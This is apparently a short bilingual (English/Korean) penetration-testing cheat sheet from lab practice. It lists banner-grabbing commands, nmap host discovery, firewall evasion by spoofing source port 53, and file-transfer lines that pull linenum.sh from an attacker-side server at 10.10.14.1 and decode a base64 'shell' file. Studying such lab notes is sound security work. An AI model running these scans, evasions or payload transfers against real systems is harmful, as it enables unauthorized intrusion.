# Banner Graping
```bash
nc -nv <ip> <port>

curl -IL https://www.inlanefreight.com

whatweb --no-errors 10.10.10.0/24

ssl certificate

http://10.10.10.10/robots.txt

javascript source code
```
---
# File transfer
```bash
wget http://10.10.14.1:8000/linenum.sh

curl http://10.10.14.1:8000/linenum.sh -o linenum.sh

scp linenum.sh user@remotehost:/tmp/linenum.sh

echo <base64 encoded file> | base64 -d > shell
```
---
# nmap
```bash
sudo nmap -sn -oA tnet -iL ip.list

sudo nmap 10.129.2.18 -sn -oA host -PE --packet-trace --disable-arp-ping
```
- `-sn` : Disables port scanning.
- `-PE` : ICMP Echo requests(ping test)
-  `--disable-arp-ping` : 라우터 너머에 있는 호스트는 ARP로 도달 불가능하므로 ICMP/TCP 필요
---
# 방화벽 우회

```bash
sudo nmap -sV 10.129.22.22 -Pn -p53 -sU

sudo nmap -sV 10.129.22.22 -Pn -p53

sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53

ncat -nv -p 53 10.129.2.28 50000
```
- DNS는 TCP,UDP 둘다 53번 포트에서 작동하며, 크기에 따라서 사용이 달라진다.
